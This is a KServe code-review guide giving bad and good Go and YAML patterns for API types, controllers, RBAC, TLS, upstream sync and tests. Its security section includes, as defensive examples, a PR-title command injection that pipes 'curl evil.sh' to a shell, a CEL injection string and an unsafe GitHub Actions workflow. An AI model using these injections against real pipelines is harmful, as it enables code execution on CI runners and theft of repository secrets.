# KServe Review Examples

Concrete patterns from actual review history. Each example shows the trigger, what to flag, and a representative
comment.

## API Design

### Wire-Safe Numeric Types (API-070)

**Trigger:** a diff adds or changes a numeric field in a `*_types.go` under `pkg/apis/`.

```go
// BAD
type RouterSpec struct {
    MaxConnections  int     `json:"maxConnections,omitempty"`  // platform-width, invalid OpenAPI type
    Weight          uint16  `json:"weight,omitempty"`          // no JSON/OpenAPI representation
    ScaleFactor     float64 `json:"scaleFactor,omitempty"`     // float rounding in a spec
    Timeout         int64   `json:"timeout,omitempty"`         // unit lives only in the comment
    Memory          string  `json:"memory,omitempty"`          // hand-parsed quantity
}

// GOOD
type RouterSpec struct {
    MaxConnections  *int32             `json:"maxConnections,omitempty"`
    Weight          *int32             `json:"weight,omitempty"`
    ScaleFactor     *resource.Quantity `json:"scaleFactor,omitempty"`
    TimeoutSeconds  *int64             `json:"timeoutSeconds,omitempty"`
    Memory          *resource.Quantity `json:"memory,omitempty"`
}

// NOT A FINDING: shipped fields keep their types
type ServingRuntimePodSpec struct {
    Replicas *uint16 `json:"replicas,omitempty"`  // v1alpha1, already released
}
```

**Applicability boundary:** added or changed fields only. KServe ships `int` and `*uint16` API fields
(`ServingRuntimeSpec.Replicas`, `PredictorSpec.BatchSize`, `ModelStatus.FailedCopies`); retyping them is a breaking
change under API-030 and costs more than the inconsistency.

**Why:** `int` has no fixed width and no OpenAPI mapping, unsigned types force every client to cast, and a bare number
whose unit lives in a comment is guessed wrong by the next caller.

### Required Does Not Mean Non-Empty (API-080)

**Trigger:** a diff adds a field with `+required`, `+optional`, or any `+kubebuilder:validation` marker.

```go
// BAD: required guarantees presence, not content — "" passes
// +required
Name string `json:"name"`

// BAD: required and a pointer — "absent" and "zero" become indistinguishable for no gain
// +required
Replicas *int32 `json:"replicas"`

// GOOD: the contract rejects the zero value, so constrain it
// +required
// +kubebuilder:validation:MinLength=1
Name string `json:"name"`

// GOOD: required, non-pointer
// +required
Replicas int32 `json:"replicas"`

// GOOD: optional is a pointer with omitempty
// +optional
Weight *int32 `json:"weight,omitempty"`

// NOT A FINDING: zero is a legitimate value here
// +required
MinReplicas int32 `json:"minReplicas"`   // scale-to-zero is the point

// NOT A FINDING: empty is legitimate
// +optional
Overrides map[string]string `json:"overrides,omitempty"`
```

**Applicability boundary:** ask for `MinLength`/`Minimum`/`MinItems` only when the field's own contract rejects its
zero value. Adding them reflexively breaks valid existing objects on the next CRD apply. Before filing a "missing
marker", check whether the marker is inherited from an embedded struct, and check the generated CRD under
`config/crd/full/` — a misspelled marker is silently dropped by controller-gen while the Go source still reads fine.

**Why:** the schema is what the API server enforces. Go markers are only the input to it.

### Nested Validation Under an Optional Parent (API-090)

**Trigger:** a diff adds a default or a required child inside a struct whose parent field is `+optional`.

```go
// BAD: none of this runs when `router` is absent from the CR
type LLMInferenceServiceSpec struct {
    // +optional
    Router *RouterSpec `json:"router,omitempty"`
}

type RouterSpec struct {
    // +required
    // +kubebuilder:default="round_robin"
    Strategy string `json:"strategy"`
}
```

```yaml
# The object below is accepted, and spec.router.strategy never exists.
spec:
  model:
    uri: hf://meta-llama/Llama-3.1-8B
```

```go
// GOOD: make the parent materialize, and make its default satisfy the child
// +optional
// +kubebuilder:default={}
Router *RouterSpec `json:"router,omitempty"`
```

```yaml
# generated CRD — confirm the parent default is present, not just the child's
router:
  type: object
  default: {}
  properties:
    strategy:
      type: string
      default: round_robin
```

**Applicability boundary:** only when the child invariant must hold unconditionally. A genuinely opt-in subtree
(`spec.router` meaning "no router at all") is correct as-is — an absent parent is a real state, not a missing default.
Verify from the generated CRD; whether parent defaulting cascades is a property of the emitted schema.

**Why:** structural schema defaulting walks only the branches that exist in the stored object. An absent parent skips
the entire subtree, so the controller reads a zero value it was told could never occur.

### Conditions Follow the Type's Existing Machinery (API-100)

**Trigger:** a diff adds a status type, a condition field, or a new state-reporting field.

```go
// NOT A FINDING: this is KServe's norm. duckv1.Status owns the condition list.
type LLMInferenceServiceStatus struct {
    duckv1.Status `json:",inline"`
    // ...
}
// knative's apis.Condition has NO ObservedGeneration field, and apis.ConditionSet
// already manages lastTransitionTime, the Ready rollup, and reason/message propagation.
// Reviewable checks for these types live in CTL-080, not here.

// BAD: a genuine []metav1.Condition with no list semantics
type InferencePoolStatus struct {
    Conditions []metav1.Condition `json:"conditions,omitempty"`
}

// GOOD
type InferencePoolStatus struct {
    // +listType=map
    // +listMapKey=type
    // +patchStrategy=merge
    // +patchMergeKey=type
    // +optional
    Conditions []metav1.Condition `json:"conditions,omitempty" patchStrategy:"merge" patchMergeKey:"type"`
}

// BAD: a new single-state status string
type Status struct {
    Phase string `json:"phase,omitempty"`  // "Pending" | "Running" | "Failed"
}

// GOOD: state goes in conditions, which compose
meta.SetStatusCondition(&status.Conditions, metav1.Condition{
    Type:               "Ready",
    Status:             metav1.ConditionFalse,
    Reason:             "WorkloadNotReady",
    ObservedGeneration: obj.Generation,
})
```

**Applicability boundary:** establish which machinery the type uses *first*. Telling a `duckv1.Status` type to adopt
`metav1.Condition` markers or per-condition `observedGeneration` is a demand to break every existing consumer. In
KServe only `pkg/apis/gie/` (the upstream-shaped InferencePool family) uses `[]metav1.Condition`. The `status.phase`
clause is preventive — KServe has none today, so flag new ones only.

**Why:** without `listType=map`/`listMapKey=type`, server-side apply treats the condition list as atomic and two
controllers writing different conditions clobber each other. A `phase` string cannot express two simultaneous facts,
which is why upstream deprecated it.

## Controller Patterns

### Exit Early (CTL-010)

```go
// BAD: deep nesting
if !llmSvc.DeletionTimestamp.IsZero() {
    if condition {
        // deeply nested logic
    }
} else {
    // main logic
}

// GOOD: exit early
if !llmSvc.DeletionTimestamp.IsZero() {
    return r.reconcileFinalization(ctx, llmSvc)
}
// main logic at low indentation
```

> "I would make this `if` reversed to not have the deeper nesting and follow the exit early pattern"

### Nil Guard on Nested Specs (CTL-020)

```go
// BAD: assumes all fields are non-nil
name := llmSvc.Spec.Router.Scheduler.Pool.Spec.ExtensionRef.Name

// GOOD: guard each level
if llmSvc.Spec.Router == nil || llmSvc.Spec.Router.Scheduler == nil ||
   llmSvc.Spec.Router.Scheduler.Pool.HasRef() {
    // handle default/fallback
}
```

> "This function is also used to handle transitions from 'scheduler enabled' to 'scheduler disabled', where any of these
> fields can be nil and we need to guard it"

### No Events on Success (CTL-030)

```go
// BAD: event on every successful reconcile
r.Recorder.Event(obj, corev1.EventTypeNormal, "Reconciled", "Successfully reconciled")

// GOOD: only on state transitions or errors
if err != nil {
    r.Recorder.Event(obj, corev1.EventTypeWarning, "ReconcileFailed", err.Error())
}
```

> "Producing an event on success (but also on no-op) can cause a high load on the API server and trigger client-side
> rate limiting. A non-error doesn't mean the object is ready, so the message might be misleading."

### Handle CRD Not Installed (CTL-040)

```go
// BAD: only checks NotFound
if apierrors.IsNotFound(err) {
    return nil
}

// GOOD: also handles CRD not installed
if !apierrors.IsNotFound(err) && !meta.IsNoMatchError(err) {
    return err
}
```

> "Generic CRUD functions handle IsNotFound and IsNoMatchError (IsNoMatchError == LWS is not installed)"

### Extensible Actuator Pattern (CTL-070)

```go
// BAD: monolithic scaling reconciliation
func reconcileScaling(ctx context.Context, ...) error {
    if scaling.WVA != nil {
        if scaling.WVA.HPA != nil { /* HPA logic */ }
        if scaling.WVA.KEDA != nil { /* KEDA logic */ }
    }
}

// GOOD: each actuator handles its own lifecycle
func reconcileActuator(...) {
    reconcileHPA(...)
    reconcileKEDAScaledObject(...)
}

func reconcileHPA(...) {
    if scaling == nil || scaling.WVA == nil || scaling.WVA.HPA == nil {
        Delete(...)
        return
    }
    // reconcile HPA
}
```

> "The logic assumes 2 actuators. Structure it in a way that is extensible, with individual functions handling deletions
> of their own objects."

### Cached vs Uncached List (CTL-120)

**Trigger:** a diff adds a `List` call.

```go
// BAD: uncached, cluster-wide, unbounded — materializes every pod in the cluster
var pods corev1.PodList
if err := r.APIReader.List(ctx, &pods); err != nil { ... }

// GOOD: page it
pager := pager.New(func(ctx context.Context, opts metav1.ListOptions) (runtime.Object, error) {
    return clientset.CoreV1().Pods("").List(ctx, opts)
})
pager.PageSize = 500

// GOOD: or scope it and let the cache serve it
var pods corev1.PodList
err := r.List(ctx, &pods, client.InNamespace(ns), client.MatchingLabels{...})

// NOT A FINDING: cache-backed List without Limit
var routes gatewayapi.HTTPRouteList
err := r.List(ctx, &routes, client.InNamespace(llmSvc.Namespace))
```

**Applicability boundary:** the rule is about *uncached* reads — `APIReader`, raw clientsets, REST. The
controller-runtime client reads from the informer cache, so a missing `Limit` there is not a defect. Flag only
collections that can realistically be large.

**Why:** unpaginated lists of large collections spike memory in both the controller and the API server, and several
controllers doing it concurrently has taken API servers down.

### Subset vs Exact Comparison (CODE-050)

**Trigger:** a diff compares a desired resource against the current one to decide whether to update.

```go
// BAD: the gateway controller adds status-derived fields and a webhook injects
// annotations. DeepEqual sees drift every reconcile and updates forever.
if !equality.Semantic.DeepEqual(desired.Spec, current.Spec) {
    return r.Update(ctx, desired)
}

// GOOD: compare only what this controller owns
if !equality.Semantic.DeepDerivative(desired.Spec, current.Spec) {
    return r.Update(ctx, desired)
}

// GOOD for labels: subset check, plus a stale check for the keys we manage
needsUpdate := !equality.Semantic.DeepDerivative(desired.Labels, current.Labels)
for _, k := range managedLabelKeys {
    if _, want := desired.Labels[k]; !want {
        if _, have := current.Labels[k]; have {
            needsUpdate = true // we removed it, so it must go
        }
    }
}
```

**Applicability boundary:** exact comparison is correct when the controller owns every compared field, or when removal
is semantic - dropping a backendRef because a group member was deleted must be detected. Establish ownership first;
this is not a blanket "always use DeepDerivative" rule.

**Why:** an update loop against a field someone else owns burns API quota, floods the audit log, and can restart
workloads on every reconcile.

### EnvVar Intent Detection (CODE-060)

**Trigger:** controller code branches on the value of an existing `corev1.EnvVar`.

```go
// BAD: a user who sets VLLM_ARGS from a ConfigMap gets Value == "", so the
// controller decides they "didn't set it" and overwrites their configuration
for _, e := range container.Env {
    if e.Name == "VLLM_ARGS" && e.Value != "" {
        return // user opted out, don't inject
    }
}

// GOOD: presence is the signal, not the literal value
for _, e := range container.Env {
    if e.Name == "VLLM_ARGS" && (e.Value != "" || e.ValueFrom != nil) {
        return
    }
}

// BETTER: don't infer intent from env at all
if llmSvc.Spec.Template.DisableArgInjection {
    return
}
```

**Applicability boundary:** not a finding when the contract is explicitly literal-only and validated as such, for
example a numeric tuning value the controller parses and range-checks.

**Why:** `Value` and `ValueFrom` are mutually exclusive in the Kubernetes API. Any check that reads only `Value`
silently misclassifies every Secret- or ConfigMap-sourced variable, and the failure is invisible until a user reports
their setting being ignored.

### Swallowed Error vs Returned Error (CTL-110)

**Trigger:** a diff changes what `Reconcile` returns on a failure path.

```go
// BAD: the error is discarded. Logs and metrics show a successful reconcile,
// and the flat 30s retry replaces exponential backoff.
if err := r.reconcileRouter(ctx, llmSvc); err != nil {
    log.Error(err, "router reconcile failed")
    return ctrl.Result{RequeueAfter: 30 * time.Second}, nil
}

// GOOD: return the error, let controller-runtime rate-limit the retry
if err := r.reconcileRouter(ctx, llmSvc); err != nil {
    return ctrl.Result{}, fmt.Errorf("reconciling router: %w", err)
}

// NOT A FINDING: redundant, but the result is ignored when err != nil
return ctrl.Result{Requeue: true}, err
```

**Applicability boundary:** `Requeue: true` alongside a non-nil error does not bypass backoff — controller-runtime
ignores `ctrl.Result` entirely when the error is non-nil. Do not report that as the violation. The violation is
returning `nil` in place of a real failure.

**Why:** a swallowed error is invisible to `controller_runtime_reconcile_errors_total`, so the failure never alerts,
and the hand-rolled interval retries a hot dependency at a fixed rate instead of backing off.

### Order-Independent Derived Names (CTL-130)

**Trigger:** a name, volume, or container is derived from a loop index and reaches a pod template.

```go
// BAD: reordering spec.Model.Adapters renames every volume after the moved entry,
// changing the pod template hash and restarting the workload
for i, adapter := range llmSvc.Spec.Model.Adapters {
    volumes = append(volumes, corev1.Volume{Name: fmt.Sprintf("adapter-%d", i)})
}

// GOOD: derive from a stable semantic key, after sorting for deterministic ordering
adapters := slices.SortedFunc(slices.Values(llmSvc.Spec.Model.Adapters),
    func(a, b Adapter) int { return strings.Compare(a.Name, b.Name) })
for _, adapter := range adapters {
    volumes = append(volumes, corev1.Volume{Name: "adapter-" + adapter.Name})
}
```

**Applicability boundary:** index-derived names are fine when they never reach a workload resource - a log line, a
metric label, or an in-memory map key does not restart pods.

**Why:** same failure class as CTL-100. The user changed the order of a list, not the content, and their pods restarted.

### Finalizer Removal Must Be Guaranteed (CTL-150)

**Trigger:** a diff adds `controllerutil.AddFinalizer` or changes a deletion path.

```go
// BAD: cleanup errors on an already-deleted gateway, so the finalizer is never
// removed and the object (and its namespace) can never finish deleting
if !obj.DeletionTimestamp.IsZero() {
    if err := r.deleteGateway(ctx, obj); err != nil {
        return ctrl.Result{}, err
    }
    controllerutil.RemoveFinalizer(obj, finalizerName)
    return ctrl.Result{}, r.Update(ctx, obj)
}

// GOOD: cleanup is idempotent, absence is success, removal always happens
if !obj.DeletionTimestamp.IsZero() {
    if err := r.deleteGateway(ctx, obj); client.IgnoreNotFound(err) != nil {
        return ctrl.Result{}, fmt.Errorf("cleaning up gateway: %w", err)
    }
    controllerutil.RemoveFinalizer(obj, finalizerName)
    return ctrl.Result{}, r.Update(ctx, obj)
}
```

**Applicability boundary:** not a finding when cleanup already treats `IsNotFound` as success and the finalizer is
removed unconditionally afterwards. The reverse is also a finding: removing the finalizer *before* cleanup completes
leaks the external resource.

**Why:** a stuck finalizer is not self-healing. The object hangs in `Terminating` forever and takes its namespace with
it, and recovery requires an operator to hand-edit `metadata.finalizers`.

## Status Conditions

### Subcondition Aggregation (CTL-080)

```go
// BAD: directly set RouterReady from one check
status.MarkTrue(RouterReady)

// GOOD: subconditions aggregate to parent
// GatewaysReady → RouterReady
// InferencePoolReady → RouterReady
status.MarkTrue(GatewaysReady)
// RouterReady is computed from subconditions
```

> "I'd add a 'GatewaysReady' condition and a separate 'DetermineRouterReadiness'. Adding a condition is non-breaking but
> removing is breaking — since we're unsure, leave the single condition for now."

### Continuous State = Condition, Not Event (CTL-080)

```go
// BAD: emit events for ongoing scaling state
r.Recorder.Event(obj, "Normal", "Scaling", "Currently scaling up")

// GOOD: use a non-terminal status condition
status.SetCondition(ScalingActive, metav1.ConditionTrue, "ScalingUp", msg)
```

> "These are continuous states rather than point-in-time occurrences. Using events could cause an event flood. Use
> non-terminal conditions purely for observability."

### No Restart on Controller Upgrade (CTL-100)

```go
// BAD: unconditional shell quoting changes the command string across versions
// v3.4: "mkdir -p '/mnt/models' && ln -sf ..."
// v3.5: "mkdir -p /mnt/models && ln -sf ..."
// → different string → different pod template hash → pod restart on upgrade
func shellQuote(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// GOOD: conditional quoting preserves existing command strings (kserve/kserve#5780)
func ShellQuote(s string) string {
    if isShellSafe(s) { return s }
    return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}
```

```go
// BAD: injecting a new annotation into the pod template during reconcile
// Existing pods get a new template hash → rollout
podTemplate.Annotations["serving.kserve.io/deployment-mode"] = "RawDeployment"

// GOOD: annotations that don't affect runtime go on the Deployment metadata,
// NOT the pod template. Or: ensure the annotation was always present.
deployment.Annotations["serving.kserve.io/deployment-mode"] = "RawDeployment"
```

```go
// BAD: changing default security context in reconciler output
// v3.4 didn't set readOnlyRootFilesystem, v3.5 sets it to true
// → different pod template → restart
container.SecurityContext.ReadOnlyRootFilesystem = ptr.To(true)

// GOOD: if adding security hardening, only apply to NEW deployments
// or make it a versioned config in llmisvcconfig so users control the rollout
```

> "We've run into different restart/rollout issues because of unrelated annotations/labels get added."
> The test: "If only the controller binary changes, does `kubectl diff` show changes on any managed Deployment?"

## Upstream Sync

### Don't Modify Upstream Files (SYNC-010)

```yaml
# BAD: adding comments to upstream kustomization.yaml
# ODH-SPECIFIC: removed component X
resources:
  - ...

# GOOD: use odh overlay to exclude/patch
# config/overlays/odh/kustomization.yaml
patchesStrategicMerge:
  - remove-component-x.yaml
```

> "We will generally have an easier time dealing with conflicts if we don't patch upstream code with code comments and
> instead have odh overlay remove/patch what's not needed."

### Sync Over Cherry-Pick (SYNC-020)

> "Instead of cherry picking a specific commit to master, can we do a sync from kserve/master so that the history is
> aligned? Moving forward that should be the flow."

### Build Tags on Distro-Only Files (SYNC-050)

**Trigger:** an ODH diff adds or changes a `.go` file. Read `$work_dir/.rules/build-tags.md` first.

```go
// BAD: OCP import compiled into the upstream build, and the logic sits inline in an upstream file
// pkg/controller/v1beta1/inferenceservice/controller.go
import routev1 "github.com/openshift/api/route/v1"

func (r *Reconciler) Reconcile(...) {
    // ODH only: create an OpenShift Route
    if err := r.createRoute(ctx, isvc); err != nil { ... }
}

// GOOD: the upstream file gains a hook call and nothing else
// controller.go
if err := r.extendReconcile(ctx, isvc); err != nil { ... }

// controller_setup_default.go
//go:build !distro

package inferenceservice

func (r *Reconciler) extendReconcile(ctx context.Context, isvc *v1beta1.InferenceService) error { return nil }

// controller_setup_odh.go
//go:build distro

package inferenceservice

import routev1 "github.com/openshift/api/route/v1"

func (r *Reconciler) extendReconcile(ctx context.Context, isvc *v1beta1.InferenceService) error { ... }
```

```go
// BAD: commented-out code instead of build-tag exclusion
// func applyHardwareProfile(pod *corev1.Pod) {
//     pod.Spec.NodeSelector = ...
// }
```

**Applicability boundary:** ODH only — `is_odh` must be true. `kserve/kserve` has no `distro` tag and no `_odh.go`
convention. Additive `*_odh.go` files that import no OCP package do not strictly need the tag. Detection is not just
imports: identifiers (`ODHS3Endpoint`, `applyHardwareProfile`), comments (`// ODH only`), and string literals
(`"opendatahub.io/hardware-profile-name"`) all mark midstream logic that must not sit in an upstream-owned file.

**Why:** every inline edit to an upstream-owned file is a merge conflict on the next sync, and an untagged OCP import
breaks the upstream build outright.

### Hook Pairs Must Be Complete (SYNC-060)

**Trigger:** an ODH diff adds a `*_odh.go` file.

```go
// BAD: upstream code calls the hook, but only the distro implementation exists.
// `go build` without GOTAGS=distro fails to link.
// router_odh.go
//go:build distro

func (r *Reconciler) configureIngress(...) error { ... }
// ...and no router_default.go anywhere in the package.

// GOOD: both variants
// router_default.go — //go:build !distro — no-op
// router_odh.go     — //go:build distro   — real implementation

// NOT A FINDING: purely additive, nothing upstream calls it
// constants_odh.go
package llmisvc

const ODHHardwareProfileAnnotation = "opendatahub.io/hardware-profile-name"
```

**Applicability boundary:** the missing counterpart is a finding only when upstream code references the symbol. Check
the existing tree, not only the diff — the `*_default.go` may already be there.

**Why:** the untagged build is the upstream build. A one-sided hook makes it fail to compile.

### RBAC Markers Need a `distro/` Package (SYNC-070)

**Trigger:** an ODH diff adds a `//+kubebuilder:rbac:` marker, or changes a generated RBAC manifest.

```go
// BAD: the build tag does not save you — controller-gen ignores build constraints,
// so this marker lands in the upstream config/rbac/role.yaml.
// pkg/controller/v1alpha2/llmisvc/controller_odh.go
//go:build distro

package llmisvc

//+kubebuilder:rbac:groups=route.openshift.io,resources=routes,verbs=get;list;watch;create

// GOOD: package-level separation, generated by its own controller-gen run in Makefile.overrides.mk
// pkg/controller/v1alpha2/llmisvc/distro/controller_rbac_odh.go
package distro

//+kubebuilder:rbac:groups=route.openshift.io,resources=routes,verbs=get;list;watch;create
```

```yaml
# BAD (downstream symptom): openshift.io groups appearing in the upstream generated role
# config/rbac/role.yaml
- apiGroups: ["route.openshift.io"]
  resources: ["routes"]
```

**Applicability boundary:** a `distro/` file with no build tag containing only a package clause and markers is the
*correct* pattern — do not flag it. `*.istio.io` markers get a non-blocking question, not a violation, since upstream
kserve uses istio too. `.rules/rbac-isolation.md` names files carrying pre-existing OCP markers
(`inferenceservice/controller.go`, `inferencegraph/controller.go`); flag only markers the PR adds.

**Why:** `controller-gen` parses every Go file regardless of build constraints. Only the package boundary keeps
midstream permissions out of the manifest upstream ships.

## Security & TLS

### TLS for New Services (SEC-010, SEC-020)

```yaml
# When adding a new sidecar (e.g., tokenizer), MUST:
# 1. Add service DNS to certificate SANs
# 2. Pass TLS flags matching the main workload pattern
# 3. Mount cert volumes

# Reference patterns in:
# - workload_tls_self_signed.go (SAN builder)
# - config-llm-template.yaml (TLS args + volume mounts)
```

> "We need to include the tokenizer in SANs and IPs of the certificate too... we need to pass TLS flags when enabled (+
> volume mount similar to the main workload)"

### No InsecureSkipVerify (SEC-030)

> "Routing sidecar supports certificate rotation, it's automatic. I'm wondering if we want to annotate our configs and
> gate on that here."

### Authorization Path Mismatch (SEC-060)

```yaml
# BAD: request with model routing header falls through to instance-level SAR
# Routing: header sends request to tenant-B's Service
# Auth: inference-access checks path /{tenant-A-ns}/{tenant-A-name} → SAR passes → cross-tenant access
inference-access:
  when:
    - predicate: "!request.path.startsWith('/v1/')"
    # Missing: no guard against model routing header being present
    # A request with both path segments AND model header uses the wrong auth path

# GOOD: explicitly deny when model routing header is present but model-access-path didn't fire
# Fail closed: the routing signal (header) and auth check (path) must agree
model-routing-deny:
  when:
    - predicate: >-
        '{{.ModelRoutingHeader}}' in request.headers
        && request.headers['{{.ModelRoutingHeader}}'].matches('^publishers/[^/]+/models/.+$')
    - predicate: >-
        !auth.identity.resolvedPath.matches('^/publishers/[^/]+/models/')
  response:
    unauthorized:
      message: "model routing header present but model authorization failed"
```

> The routing signal (header, path prefix) and the authorization check must always agree on which resource is being
> accessed. Cross-path fallthrough enables cross-tenant escalation.
> Discovered in https://github.com/opendatahub-io/odh-model-controller/pull/881

### CEL Injection Prevention (SEC-070)

```go
// BAD: no validation of interpolated value
template := `request.headers['{{.ModelRoutingHeader}}']`
// If ModelRoutingHeader = "x']); malicious_cel(request.headers['y"
// → request.headers['x']); malicious_cel(request.headers['y']

// GOOD: strict allowlist before interpolation
func isValidHTTPHeaderName(name string) bool {
    return regexp.MustCompile(`^[a-z0-9][a-z0-9\-_]*$`).MatchString(name)
}
// + unit tests for: empty string, uppercase, dots, quotes, backslashes,
//   parentheses, pipes, ampersands, multi-byte Unicode
```

### Plaintext Listeners and Dials (SEC-075)

**Trigger:** a diff adds a server listener, a gRPC dial, or an outbound HTTP client.

```go
// BAD: plaintext listener reachable on the pod network
srv := &http.Server{Addr: ":8080", Handler: mux}
srv.ListenAndServe()

// BAD: gRPC dial without transport credentials
conn, err := grpc.NewClient(schedulerAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))

// GOOD: TLS on anything crossing the pod boundary
srv := &http.Server{Addr: ":8443", Handler: mux, TLSConfig: tlsCfg}
srv.ListenAndServeTLS(certFile, keyFile)

conn, err := grpc.NewClient(schedulerAddr, grpc.WithTransportCredentials(credentials.NewTLS(tlsCfg)))

// NOT A FINDING: intra-pod, bound to loopback only
srv := &http.Server{Addr: "127.0.0.1:8080", Handler: mux}
```

**Applicability boundary:** the localhost exception is about the bind address, not the caller. `:8080` and
`0.0.0.0:8080` are reachable from the pod network and are findings even when the only current client is a sidecar in
the same pod - the next caller may not be.

**Why:** unencrypted traffic between pods is readable and modifiable by anything on the cluster network, and FIPS and
restricted-cluster deployments reject plaintext service-to-service traffic outright.

### Least-Privilege RBAC (SEC-080)

**Trigger:** a diff adds an RBAC rule or a `//+kubebuilder:rbac` marker.

```yaml
# BAD: wildcard verbs on secrets, and escalate makes every other limit moot
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles"]
  verbs: ["escalate", "bind"]

# GOOD: only what the reconciler calls, scoped where the set is known
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["secrets"]
  resourceNames: ["kserve-storage-config"]
  verbs: ["update"]
```

**Applicability boundary:** access to `secrets`, `pods/exec`, `nodes/proxy` is often legitimate — KServe reads storage
credentials by design. Require scoping, not removal. Cross-check the marker against what the reconciler actually calls;
a grant wider than the code is the common drift. Do not propose narrowing a grant an existing watch depends on
(BUG-050).

**Why:** `escalate` and `bind` let the holder grant themselves any permission, so every other restriction in the role
becomes decorative.

### ServiceAccount Token Automount (SEC-090)

**Trigger:** a diff adds a new workload or pod template.

```yaml
# BAD: new sidecar with no Kubernetes API calls still gets a mounted SA token
spec:
  template:
    spec:
      containers:
        - name: tokenizer
          image: kserve-tokenizer:latest

# GOOD: matches config/llmisvcconfig/config-llm-tokenizer.yaml
spec:
  template:
    spec:
      serviceAccountName: kserve-tokenizer
      automountServiceAccountToken: false
      containers:
        - name: tokenizer
          image: kserve-tokenizer:latest
```

**Applicability boundary:** two hard exclusions. (1) The setting is inherited from the ServiceAccount, so a pod whose SA
already sets `automountServiceAccountToken: false` is compliant — check both before filing. (2) This applies to *new*
workloads. Adding it to an existing controller-managed pod template changes the pod template hash and forces a rollout
on upgrade, which is a CTL-100 violation; for existing templates raise it as a note, not a required change.

**Why:** a mounted token turns any container-level RCE into cluster API access with the SA's full permissions.

### Untrusted Input in GitHub Actions (SEC-100)

**Trigger:** a diff changes a file under `.github/workflows/`.

```yaml
# BAD: PR title is attacker-controlled and lands inside a shell command
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
# a PR titled  "; curl evil.sh | sh; #  executes on the runner

# BAD: pull_request_target checks out and runs untrusted PR code with a
# privileged token and access to repository secrets
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: make test

# GOOD: event data through env, quoted; this is the established kserve pattern
# (see .github/workflows/pr-style-check.yml)
env:
  TITLE: ${{ github.event.pull_request.title }}
run: |
  echo "Reviewing $TITLE"

# GOOD: SHA-pinned action, base ref, scoped permissions
permissions:
  pull-requests: write
steps:
  - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
    with:
      ref: master
```

**Applicability boundary:** `pull_request_target` alone is not a finding. KServe uses it correctly in
`auto-assign-reviewers.yml` and `pr-style-check.yml` — SHA-pinned actions, `ref: master`, event data via `env:`, scoped
permissions. Flag the unsafe combination (privileged trigger + PR-head checkout + execution), not the trigger.

**Why:** a workflow that executes untrusted code with `pull_request_target`'s token can exfiltrate every secret in the
repository, and injection into `run:` needs only a crafted PR title.

### Secret Material in Logs and Errors (SEC-110)

**Trigger:** a diff adds a log line, error wrap, Event, or condition message near credential handling.

```go
// BAD: the token value is now in the log aggregator forever
log.Info("injecting credentials", "token", string(secret.Data["HF_TOKEN"]))
return fmt.Errorf("auth failed with key %s: %w", apiKey, err)

// BAD: logging the whole Secret embeds every value
log.V(2).Info("loaded storage secret", "secret", secret)

// GOOD: reference it, don't print it
log.Info("injecting credentials", "secret", klog.KObj(secret), "key", "HF_TOKEN")
return fmt.Errorf("auth failed using secret %s/%s: %w", secret.Namespace, secret.Name, err)

// NOT A FINDING: a key *name*, not the credential
log.Info("injecting storage spec credentials", "storageKey", *modelInfo.Storage.StorageKey)
```

**Applicability boundary:** this rule is easy to over-apply. Secret names, namespaces, key names, field selectors,
ServiceAccount names, and object references are all safe to log — only the value itself is a finding. When it is
genuinely unclear whether an identifier is a name or a value, resolve the type before filing.

**Why:** logs are copied to aggregators, support bundles, and must-gathers. A credential written once is exposed
everywhere those land, and rotation is the only remedy.

## Migration Safety

### Webhook Name Stability (MIG-020, NAM-020)

```yaml
# BAD: renaming webhook during version bump
name: llminferenceservice-v1alpha2.kserve-webhook-server.validator

# GOOD: keep existing name, add new version as separate webhook
# Old name continues to work during rolling upgrade
```

> "By changing the name, an existing installation when upgrading will continue to have the old webhook as a 'ghost'
> without match policy set."

### Version-Aware Fallback (MIG-020)

```go
// BAD: assume latest API version is available
pool := r.createInferencePoolV1(ctx, svc)

// GOOD: check version support, fallback
if r.InferencePoolV1Available {
    pool = r.createInferencePoolV1(ctx, svc)
} else {
    pool = r.createInferencePoolV1Alpha2(ctx, svc)
}
```

> "We cannot do this as there might be services running with older releases. Check what's the scheduler version and
> fallback to previous version if it cannot be determined."

### Label Propagation Restarts (MIG-010)

> "We've run into different restart/rollout issues because of unrelated annotations/labels get added. Keeping the list
> of disallowed up to date is very difficult."

### Template Function Contract (MIG-050)

```go
// BAD: removing or renaming existing template functions (kserve/kserve#5717)
// Previously shipped llmisvcconfig files call these by name — removing breaks upgrade
t, err := template.New("config").
    Funcs(map[string]any{
-       "kvTransferConfig": func(spec any) string { ... },  // REMOVED — breaks shipped configs
-       "shutdownTimeout":  func(spec any, preStop int64) int64 { ... },  // RENAMED — breaks shipped configs
+       "shutdownTimeoutScript": func(spec any, preStop int64) string { ... },  // new name, old one gone
    })

// GOOD: add new functions, keep old ones
t, err := template.New("config").
    Funcs(map[string]any{
        "kvTransferConfig":      func(spec any) string { ... },       // KEPT — shipped configs use it
        "shutdownTimeout":       func(spec any, preStop int64) int64 { ... },  // KEPT
        "shutdownTimeoutScript": func(spec any, preStop int64) string { ... }, // ADDED — new configs can use this
    })
```

> "We cannot ever remove or rename functions as these are used in previously shipped llmisvcconfig which would stop
> working on upgrade."

### Template Variable Stability (MIG-060)

```yaml
# Shipped llmisvcconfig references template variables by name:
# {{ .LLMInferenceService.Spec.Router.Scheduler.Pool.Spec.ExtensionRef.Name }}

# BAD: renaming the Go struct field changes the template variable
# type RouterSpec struct {
#     Scheduler *SchedulerSpec  →  SchedulingConfig *SchedulerSpec
# }
# All shipped configs referencing .Router.Scheduler break silently

# GOOD: if the Go struct field must change, keep the old template variable
# working via an alias or adapter in ReplaceVariables
```

## Testing

### Tests Must Fail (TST-020)

```python
# BAD: swallow assertion errors
try:
    assert len(traces) > 0
except AssertionError:
    logger.warning("traces not found")

# GOOD: fail or mark xfail with reason
assert len(traces) > 0, f"No traces found for {service}"
# or
@pytest.mark.xfail(reason="EPP may not export traces in all configs")
```

> "If the intention is to not fail the test, what are we actually getting out of this CI check? A log on a green check
